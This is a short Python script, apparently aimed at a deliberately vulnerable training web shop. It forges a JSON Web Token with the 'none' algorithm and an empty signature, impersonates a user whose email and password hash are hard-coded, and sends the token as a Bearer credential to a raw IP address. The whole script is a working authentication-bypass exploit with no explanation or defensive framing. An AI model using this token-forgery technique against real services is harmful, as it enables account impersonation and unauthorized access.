import base64
import json

import requests

# header = '{"alg":"RS256","typ":"JWT"}'

header = '{"alg":"none","typ":"JWT"}'

payload = '{"status":"success","data":{"id":7,"email":"BumblebeeMan@kwike.mart","password":"7c6a180b36896a0a8c02787eeafb0e4c","createdAt":"2018-06-22T22:02:50.423Z","updatedAt":"2018-06-22T22:02:50.423Z"},"iat":1530522928,"exp":1530540928}'

signature = ''


def encode(str):
    return base64.b64encode(str.encode('utf-8')).decode("utf-8").replace('=', '')


token = encode(header) + '.' + encode(payload) + "." + encode(signature)

print(token)





s = requests.Session()
s.headers.update({'Authorization': "Bearer " + token})
r = s.get('http://43.241.202.33:3003/rest/captcha/')
response = json.loads(r.text)

